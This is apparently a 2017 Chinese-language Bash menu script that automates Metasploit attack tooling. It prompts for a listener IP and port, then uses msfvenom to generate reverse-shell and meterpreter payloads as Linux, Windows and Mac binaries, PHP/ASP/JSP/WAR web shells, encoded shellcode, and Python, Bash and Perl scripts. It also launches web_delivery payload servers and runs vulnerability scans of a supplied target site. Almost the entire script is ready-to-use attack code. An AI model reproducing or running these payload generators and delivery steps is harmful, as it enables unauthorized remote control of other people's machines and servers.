#！ /bin/bash
LANG=zh_CN.UTF-8

#颜色定义
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'

echo    "                                  _     _   ";
echo    "                    ___  ___  ___(_)___| |_ ";
echo    "                   / __|/ _ \/ __| / __| __|";
echo    "                   \__ \  __/ (__| \__ \ |_ ";
echo    "                   |___/\___|\___|_|___/\__|";


echo -e "/==========================########========================\\"
echo -e "|                             # v1.7                       |"
echo -e "|               #Demon博客www.ggsec.cn#                    |"
echo -e "|               #Metasploit Payload Generator#             |"
echo -e "|               #自动化简单小脚本          #               |"
echo -e "|               ##即刻安全博客 www.secist.com              |"
echo -e "|———————————#—————————————————#——————————————————#—————————|"
echo -e "|                                            墨    2017    |"
echo -e "\==========================================================/"
echo -e "|               @墨###即刻安全                             |"
echo -e "|               @emali###317718435@qq.com                  |"
echo -e "\==========================================================/"
echo "   "
sleep 1
echo "   "
# check msfconsole
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfconsole='1'
else
msfconsole='0'
fi
# check msfvenom
which msfvenom > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfvenom='1'
else
msfvenom='0'
fi
# check nmap
which nmap > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
nmap='1'
else
nmap='0'
fi
# check wpscan
which wpscan > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
wpscan='1'
else
wpscan='0'
fi
# check nikto
which nikto > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
nikto='1'
else
nikto='0'
fi
echo -n Check script  = =;
sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done
if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ]  && [ "$nmap" == "1" ] && [ "$nikto" == "1" ] && [ "$wpscan" == "1" ];then
echo -en 【已找到】
echo ""
echo ""
echo -e $BlueF 'msfconsole    【已找到】'
echo -e $BlueF 'msfvenom      【已找到】'
echo -e $BlueF 'nmap          【已找到】'
echo -e $BlueF 'nikto         【已找到】'
echo -e $BlueF 'wpscan        【已找到】'
echo ""
sleep 2
fi
if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ] || [ "$nmap" == "0" ] [ "$nikto" == "0" ] || [ "$wpscan" == "0" ]; then
fail='1'
echo -en "\b \e[0;31m【Fail】\e[0m"
echo ""
echo ""
fi
if [ "$msfconsole" == "0" ] ;then
echo -e 'msfconsole    \e[0;31m【!!】 Not Found, first must be installed metasploit\e[0m';
fi
if [ "$msfvenom" == "0" ] ;then
echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
fi
if [ "$nmap" == "0" ] ;then
echo -e 'nmap          \e[0;31m【!!】 Not Found, first must be install nmap\e[0m';
fi
if [ "$nikto" == "0" ] ;then
echo -e 'nikto         \e[0;31m【!!】 Not Found, first must be install nikto\e[0m';
fi
if [ "$wpscan" == "0" ] ;then
echo -e 'wpscan        \e[0;31m【!!】 Not Found, first must be install wpscan\e[0m';
fi
echo ""
echo -e $okegreen" ===================================================================="
echo -e $cyan""
echo "           +--^----------,--------,-----,--------^-, "
echo -e "           | $red |||||||||   --------      |         O "
echo -e $cyan"           +---------------------------^----------| "
echo -e $cyan"            \_,---------,---------,--------------' "
echo -e "              / $red"XXXXXX"$cyan /'|       /' "
echo -e "             / $red"XXXXXX"$cyan /   \    /' "
echo -e "            / $red"XXXXXX"$cyan / _______/ "
echo -e "           / $red"XXXXXX"$cyan / "
echo -e "           / $red"XXXXXX"$cyan / "
echo "           (________(   "
echo -e "            ------'        $red FIVE KILL !! GO GO GO !!  "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan "       emali###317718435@qq.com$red          @墨###即刻安全  "
echo -e $cyan "                         Long live the lazy !!!         "
echo -e $okegreen" ====================================================================="
echo ""
echo ""
echo -e $red "                  [1]            MsfVenom"
echo -e $red "                  [2]            Nmap"
echo -e $red "                  [3]            Web Scanner"
echo -e $red "                  [4]            web_delivery"
echo " "
echo -e "请选择你的payload: \c"
read number
    case $number in
       1)
        echo -e $BlueF "[1]    Binaries"
        echo -e $BlueF "[2]    Web Payload"
        echo -e $BlueF "[3]    ShellCode"
        echo -e $BlueF "[4]    Scripting Payloads"
        echo -e $BlueF "MsfVenom>  \c"
        read msfnum
        ;;
       2)
        echo -e $red "[!]更新中,退出"
        read nmapnum
        ;;
       3)
        echo -e $yellow "[1]     使用Wmap进行漏洞扫描"
        echo -e $yellow "[2]     使用Nikto进行漏洞扫描"
        echo -e $yellow "[3]     使用Nmap进行漏洞扫描"
        echo -e $yellow "[!]     更新添加中"
        echo -e $yellow "Web Scanner>\c"
        read websc
        ;;
       4)
        echo -e $lightgreen "[1]    web_delivery(php)"
        echo -e $lightgreen "[2]    web_delivery(Python)"
        echo -e $lightgreen "[3]    web_delivery(PowerShell)"
        echo -e $lightgreen "web_delivery>  \c"
        read webde
        ;;
    esac
        case $msfnum in
          1)
            echo -e $okegreen "[1]    Binaries(Linux)"
            echo -e $okegreen "[2]    Binaries(windows)"
            echo -e $okegreen "[3]    Binaries(Mac)"
            echo -e $okegreen "MsfVenom>Binaries>>  \c"
            read binnum
            ;;
          2)
            echo -e $yellow "[1]    Web Payloads(php)"
            echo -e $yellow "[2]    Web Payloads(asp)"
            echo -e $yellow "[3]    Web Payloads(jsp)"
            echo -e $yellow "[4]    Web Payloads(war)"
            echo -e $yellow "MsfVenom>Web Payloads>>   \c"
            read webnum
            ;;
          3)
            echo -e $red "[1]    ShellCode(Linux Based Shellcode)"
            echo -e $red "[2]    ShellCode(windows Based Shellcode)"
            echo -e $red "[3]    ShellCode(Mac Based Shellcode)"
            echo -e $red "MsfVenom>Shellcode>>    \c"
            read shellnum
            ;;
          4)
            echo -e $white "[1]    Scripting Payloads(Python)"
            echo -e $white "[2]    Scripting Payloads(Bash)"
            echo -e $white "[3]    Scripting Payloads(Perl)"
            echo -e $while "MsfVenom>Scripting Payloads>>    \c"
            read scrnum
            ;;
        esac
            case $binnum in
                1)
                echo -e $okegreen "MsfVenom>Binaries>>(Linux)>>>请输入你本机ip： \c"
                read ip
                echo -e $okegreen "MsfVenom>Binaries>>(Linux)>>>请输入你反弹端口:  \c"
                read port
                echo "   "
                msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > shell.elf
                ;;
                2)
                echo -e $okegreen "MsfVenom>Binaries>>(windows)>>>请输入你本机ip： \c"
                read ip
                echo -e $okegreen "MsfVenom>Binaries>>(windows)>>>请输入你反弹端口:  \c"
                read port 
                echo "   "
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
                ;;
                3)
                echo -e $okegreen "MsfVenom>Binaries>>(Mac)>>>请输入你本机ip： \c"
                read ip
                echo -e $okegreen "MsfVenom>Binaries>>(Mac)>>>请输入你反弹端口:  \c"
                read port
                echo "   "
                msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > shell.macho
                ;;
            esac
        case $webnum in
          1)
            echo -e $yellow "MsfVenom>Web Payloads>>(php)>>>请输入你本机ip： \c"
            read ip
            echo -e $yellow "MsfVenom>Web Payloads>>(php)>>>请输入你反弹端口:  \c"
            read port
            echo "   "
            msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.php
            cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
            ;;
          2)
            echo -e $yellow "MsfVenom>Web Payloads>>(asp)>>>请输入你本机ip： \c"
            read ip
            echo -e $yellow "MsfVenom>Web Payloads>>(asp)>>>请输入你反弹端口:  \c"                  
            read port
            echo "   "  
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > shell.asp
            ;;
          3)
            echo -e $yellow "MsfVenom>Web Payloads>>(jsp)>>>请输入你本机ip： \c"
            read ip
            echo -e $yellow "MsfVenom>Web Payloads>>(jsp)>>>请输入你反弹端口:  \c"
            read port
            echo "   "
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.jsp
            ;;
          4)
            echo -e $yellow "MsfVenom>Web Payloads>>(war)>>>请输入你本机ip： \c"
            read ip
            echo -e $yellow "MsfVenom>Web Payloads>>(war)>>>请输入你反弹端口:  \c"
            read port
            echo "   "
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > shell.war
            ;;
        esac
        case $shellnum in
          1)
            echo -e $red "MsfVenom>Shellcode>>(Linux Based Shellcode)>>>请输入你本机ip： \c"
            read ip
            echo -e $red "MsfVenom>Shellcode>>(Linux Based Shellcode)>>>请输入你反弹端口:  \c"
            read port
            echo -e $red "MsfVenom>Shellcode>>(Linux Based Shellcode)>>>请输入你要生成的语言: \c"
            read language
            echo -e $red "MsfVenom>Shellcode>>(Linux Based Shellcode)>>>需要编码的次数:   \c"
            read ci
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
            ;;
          2)
            echo -e $red "MsfVenom>Shellcode>>(windows Based Shellcode)>>>请输入你本机ip： \c"
            read ip
            echo -e $red "MsfVenom>Shellcode>>(windows Based Shellcode)>>>请输入你反弹端口:  \c"
            read port
            echo -e $red "MsfVenom>Shellcode>>(windows Based Shellcode)>>>请输入你要生成的语言: \c"
            read language
            echo -e $red "MsfVenom>Shellcode>>(windows Based Shellcode)>>>>需要编码的次数:   \c"
            read ci
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
            ;;
          3)
            echo -e $red "MsfVenom>Shellcode>>(Mac Based Shellcode)请输入你本机ip： \c"
            read ip
            echo -e $red "MsfVenom>Shellcode>>(Mac Based Shellcode)请输入你反弹端口:  \c"
            read port
            echo -e $red "MsfVenom>Shellcode>>(Mac Based Shellcode)请输入你要生成的语言: \c"
            read language
            echo -e $red "MsfVenom>Shellcode>>(Mac Based Shellcode)需要编码的次数:   \c"
            read ci
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
            ;;
        esac
        case $scrnum in
          1)
            echo -e $white "MsfVenom>Scripting Payloads>>(Python)>>>请输入你本机ip： \c"
            read ip
            echo -e $white "MsfVenom>Scripting Payloads>>(Python)>>>请输入你反弹端口： \c"
            read port
            msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > shell.py
            ;;
          2)
            echo -e $white "MsfVenom>Scripting Payloads>>(Bash)>>>请输入你本机ip： \c"
            read ip
            echo -e $white "MsfVenom>Scripting Payloads>>(Bash)>>>请输入你反弹端口： \c"
            read port
            msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > shell.sh
            ;;
          3)
            echo -e $white "MsfVenom>Scripting Payloads>>(Perl)>>>请输入你本机ip： \c"
            read ip
            echo -e $white "MsfVenom>Scripting Payloads>>(Perl)>>>请输入你反弹端口： \c"
            read port
            msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -f raw > shell.pl
        esac
        case $webde in
          1)
            echo "   "
            echo -e $lightgreen "web_delivery>(php)>>请输入你本机ip：\c"
            read ip
            echo -e $lightgreen "web_delivery>(php)>>请输入你反弹端口： \c"
            read port
            echo "use exploit/multi/script/web_delivery" >> powershell.rc
            echo "set PAYLOAD php/meterpreter/reverse_tcp" >> powershell.rc
            echo "set TARGET 1" >> powershell.rc
            echo "set LHOST $ip" >> powershell.rc
            echo "set LPORT $port" >> powershell.rc
            echo "set URIPATH /" >> powershell.rc
            echo "run" >> powershell.rc
            msfconsole -r powershell.rc
            rm  powershell.rc
            ;;
          2)
            echo "   "
            echo -e $lightgreen "web_delivery>(Python)>>请输入你本机ip：\c"
            read ip
            echo -e $lightgreen "web_delivery>(Python)>>请输入你反弹端口： \c"
            read port
            echo "use exploit/multi/script/web_delivery" >> powershell.rc
            echo "set PAYLOAD python/meterpreter/reverse_tcp" >> powershell.rc
            echo "set TARGET 0" >> powershell.rc
            echo "set LHOST $ip" >> powershell.rc
            echo "set LPORT $port" >> powershell.rc
            echo "set URIPATH /" >> powershell.rc
            echo "run" >> powershell.rc
            msfconsole -r powershell.rc
            rm  powershell.rc
            ;;
          3)
            echo "   "
            echo -e $lightgreen "web_delivery>(Powershell)>>请输入你本机ip：\c"
            read ip
            echo -e $lightgreen "web_delivery>(Powershell)>>请输入你反弹端口： \c"
            read port
            echo "use exploit/multi/script/web_delivery" >> powershell.rc
            echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> powershell.rc
            echo "set TARGET 2" >> powershell.rc
            echo "set LHOST $ip" >> powershell.rc
            echo "set LPORT $port" >> powershell.rc
            echo "set URIPATH /" >> powershell.rc
            echo "run" >> powershell.rc
            msfconsole -r powershell.rc
            rm  powershell.rc
        esac
        case $websc in
          1)
            echo -e $yellow "Web Scanner>Wmap>>请输入目标网址: \c"
            read www
            echo "load wmap" >> wmap.rc
            echo "wmap_sites -a $www" >> wmap.rc
            echo "wmap_sites -l" >> wmap.rc
            echo "wmap_targets -D 0" >> wmap.rc
            echo "wmap_targets -L" >> wmap.rc
            echo "wmap_run -t" >> wmap.rc
            echo "wmap_run -e" >> wmap.rc
            echo "vulns" >> wmap.rc
            msfconsole -r wmap.rc
            rm  wmap.rc
            ;;
          2)
            echo -e $white "Web Scanner>nikto>>请输入目标网址: \c"
            read www
            nikto -host $www
            ;;
          3)
            echo -e $white "Web Scanner>nikto>>请输入目标网址: \c"
            read www
            nmap --script=vuln $www
        esac
